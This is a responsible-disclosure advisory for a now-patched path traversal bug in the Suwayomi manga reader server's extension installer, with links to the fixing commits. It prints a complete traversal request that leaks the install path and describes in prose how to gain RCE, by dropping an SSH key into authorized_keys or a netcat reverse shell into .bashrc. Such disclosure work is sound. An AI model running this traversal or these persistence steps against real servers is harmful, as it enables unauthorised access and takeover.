There is a lack of path checking within the extension installation code of the [Suwayomi manga reader](https://github.com/Suwayomi/Suwayomi-Server) that can lead to Information Disclosure or even RCE if the right conditions are met.
This affects the docker version and (AFAIK) all the native versions.
This issue has been fixed in the codebase, and I am releasing this info after the agreed upon disclosure date. 



## Information Disclosure

You can leak the installation directory by modifying the filename parameter within the POST request for installing an extension, and prepending a nonexistent path onto it. 
Like so:

```
POST /api/graphql HTTP/1.1
Host: localhost:4567
Content-Length: 1532
sec-ch-ua-platform: "Linux"
Accept-Language: en-GB,en;q=0.9
accept: */*
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarym08joRbyW9U3U8AB
Origin: http://localhost:4567
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://localhost:4567/browse
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

------WebKitFormBoundarym08joRbyW9U3U8AB
Content-Disposition: form-data; name="operations"

{"operationName":"INSTALL_EXTERNAL_EXTENSION","variables":{"file":null},"query":"fragment FULL_EXTENSION_FIELDS on ExtensionType {\n  apkName\n  repo\n  hasUpdate\n  iconUrl\n  isInstalled\n  isNsfw\n  isObsolete\n  lang\n  name\n  pkgName\n  versionCode\n  versionName\n  __typename\n}\n\nmutation INSTALL_EXTERNAL_EXTENSION($file: Upload!) {\n  installExternalExtension(input: {extensionFile: $file}) {\n    clientMutationId\n    extension {\n      ...FULL_EXTENSION_FIELDS\n      __typename\n    }\n    __typename\n  }\n}"}
------WebKitFormBoundarym08joRbyW9U3U8AB
Content-Disposition: form-data; name="map"

{"1":["variables.file"]}
------WebKitFormBoundarym08joRbyW9U3U8AB
Content-Disposition: form-data; name="1"; filename="../ILoveHelloKitty1234!@#$/xckd.apk"
Content-Type: application/vnd.android.package-archive

"APK CONTENTS HERE"

------WebKitFormBoundarym08joRbyW9U3U8AB--
```

The server will return an error message containing the full path of the installation.


## RCE

The file path returned by the previous bug could potentially be used to provide the username from the home directory, if Suwayomi is being run on; MAC, Windows, or with the standalone jar.

This could be used for brute forcing the password for that username against any available services like FTP, SMB, SSH, etc.


**Linux**
Prerequisites: SSHD running; Suwayomi-Server running as a user account.
Using the file path from the ID bug you can replace all the APK contents within the POST request with your ssh pubkey and modify the filepath to drop it into the user's authorized keys file.
Alternatively if SSHD isn't running you can put a netcat reverse shell inside the .bashrc, granting RCE with the caveat of overwriting the .bashrc properties.

**Windows**
I haven't tested this however I imagine you could overwrite the ``C:\Users\{username}\\SOMEFILE`` with a malicious link.

**MAC**
I'm not a Mac owner so I don't know what RCE on there would rely on.

See patches [0b192c](https://github.com/Suwayomi/Suwayomi-Server/commit/0b192cfa5243584d734b541c2c5451a50edd577e) and [3af8e3](https://github.com/Suwayomi/Suwayomi-Server/commit/3af8e395bd6f48ee7ed39011115dc190fa99a7e0)
